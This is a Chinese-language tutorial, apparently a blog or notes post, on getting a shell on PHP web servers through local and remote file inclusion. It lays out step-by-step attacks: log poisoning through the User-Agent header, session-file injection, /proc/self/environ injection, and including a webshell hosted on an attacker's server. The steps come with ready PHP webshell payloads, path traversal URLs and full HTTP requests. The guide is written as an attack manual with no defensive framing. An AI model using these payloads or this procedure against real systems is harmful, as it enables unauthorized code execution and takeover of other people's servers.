### 怎么 GetShell

**本地文件包含 (LFI) Getshell**

LFI 的 Getshell 方法通常需要结合其他漏洞或技巧。攻击者无法直接包含一个远程 Webshell，但可以通过多种方式将恶意代码注入到服务器上的某个文件中，然后利用LFI漏洞包含该文件，从而执行恶意代码

**1. 日志文件 Getshell**

这是 LFI Getshell 最经典且常用的方法之一。许多 Web 服务器（如Apache、Nginx）会将访问请求记录在日志文件中（如`access.log` 或 `error.log`）

**利用步骤：**

1. **注入恶意代码**：通过一个特制的 HTTP 请求，将恶意代码（如 PHP Webshell 代码）注入到服务器的日志文件中。例如，在 URL 中加入或在 User-Agent 字段中写入 Webshell 代码：

   ```php
   <?php eval($_GET['cmd']);?>
   ```

   一个完整的 HTTP 请求可能看起来像这样：

   ```php
   GET /?page=test.php HTTP/1.1
   Host: example.com
   User-Agent: <?php system('whoami');?>
   ```

   这样，服务器的 `access.log` 文件中就会记录下这段恶意代码

2. **包含日志文件**：利用 LFI 漏洞，通过文件包含参数（如 `page` 或 `file`），包含日志文件

   ```apl
   http://example.com/index.php?file=../../../../var/log/apache2/access.log
   ```

   当服务器执行这个请求时，它会把日志文件的内容当作 PHP 代码来执行，从而执行了我们注入的`system('whoami');` 命令

3. **获取 Webshell**：如果注入的是一个完整的 Webshell，现在就可以通过参数来执行任意命令了

   ```apl
   http://example.com/index.php?file=../../../../var/log/apache2/access.log&cmd=ls -al
   ```

**2. Session 文件 Getshell**

某些 Web 应用程序会将用户的 Session 信息保存在服务器的 `/tmp/` 目录下的文件中，文件命名通常为 `sess_PHPSESSID`。如果攻击者可以控制 Session 数据，就能通过 LFI 包含该文件 Getshell

**利用步骤：**

1. **设置 Session 值**：通过 `$_SESSION` 变量，将恶意代码注入到 Session 中。这通常需要先找到一个可以控制Session 值的参数，例如在登录或注册时

   ```php
   $_SESSION['username'] = "<?php eval($_POST['cmd']);?>";
   ```

2. **获取 Session 文件路径**：通常 Session 文件的命名是 `sess_` 加上 Session ID。可以通过浏览器 Cookies 中的`PHPSESSID` 来获取

   ```apl
   http://example.com/index.php?file=../../../../tmp/sess_f32921a92a5436687e9544485304a9d7
   ```

3. **执行恶意代码**：当 LFI 漏洞包含该 Session 文件时，恶意代码被执行

**3. /proc/self/environ Getshell**

在 Linux 系统中，`/proc/self/environ` 文件存储了当前进程的环境变量。攻击者可以通过设置 User-Agent 等环境变量，将恶意代码注入到该文件中，然后利用 LFI 漏洞包含它

**利用步骤：**

1. **设置 User-Agent**：发送一个带有恶意 User-Agent 的请求

   ```apl
   GET /index.php?page=test.php HTTP/1.1
   Host: example.com
   User-Agent: <?php system('whoami');?>
   ```

2. **包含环境变量文件**：

   ```apl
   http://example.com/index.php?file=../../../../proc/self/environ
   ```

3. **执行恶意代码**：成功包含后，恶意代码即被执行

**远程文件包含 (RFI) Getshell**

RFI 通常比 LFI 更容易利用，因为它允许攻击者直接从自己的服务器上包含并执行恶意文件

**利用步骤：**

1. **制作 Webshell 文件**：在攻击者自己的服务器上创建一个 Webshell 文件，例如 `shell.txt`，内容如下：

   ```
   <?php eval($_POST['cmd']);?>
   ```

   为了绕过一些过滤，文件名可以不使用 `.php` 后缀，例如 `shell.txt` 或 `shell.jpg`

2. **启动 HTTP 服务**：在攻击者的服务器上（如Kali Linux），使用 Python 启动一个简单的 HTTP 服务来托管`shell.txt`：

   ```bash
   python3 -m http.server 80
   ```

3. **远程文件包含**：利用 RFI 漏洞，将 URL 指向攻击者的服务器，包含 `shell.txt`

   ```apl
   http://example.com/index.php?file=http://attacker-ip/shell.txt
   ```

   **注意**：为了防止服务器对 URL 进行过滤，有时需要使用编码、伪协议（如 `data://`）等技巧

4. **连接 Webshell**：如果成功，`shell.txt` 中的 Webshell 代码已经被执行。现在就可以使用工具（如 Postman、Burp Suite）或直接在 URL 中 POST 数据来执行命令了

   ```apl
   POST /index.php?file=http://attacker-ip/shell.txt HTTP/1.1
   Host: example.com
   Content-Type: application/x-www-form-urlencoded
   
   cmd=ls -al
   ```